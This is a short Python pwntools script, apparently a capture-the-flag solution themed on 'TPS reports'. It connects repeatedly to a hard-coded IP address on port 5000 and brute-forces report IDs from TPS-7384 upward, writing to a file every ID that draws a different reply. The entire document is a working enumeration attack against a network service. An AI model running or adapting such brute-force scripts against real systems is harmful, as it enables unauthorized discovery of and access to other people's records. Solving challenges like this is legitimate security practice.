from pwn import *

for i in range(7384, 9999):
	doc = f'TPS-{i:04}'
	print(f'Testing doc {doc}')
	conn = remote('161.35.239.216', 5000)
	conn.recvuntil('2)')
	conn.recvline()
	conn.send(b'1')
	conn.recvuntil(b'Enter the Report you would like to print')
	conn.recvline()
	conn.send(doc)
	line = conn.recvline()
	if line != b"A cover sheet wasn't attached to that report, I'll make sure you get a copy -- Lumbergh\n":
		with open('reports.txt', 'a') as f:
			f.write(doc +  '\n')
	conn.close()
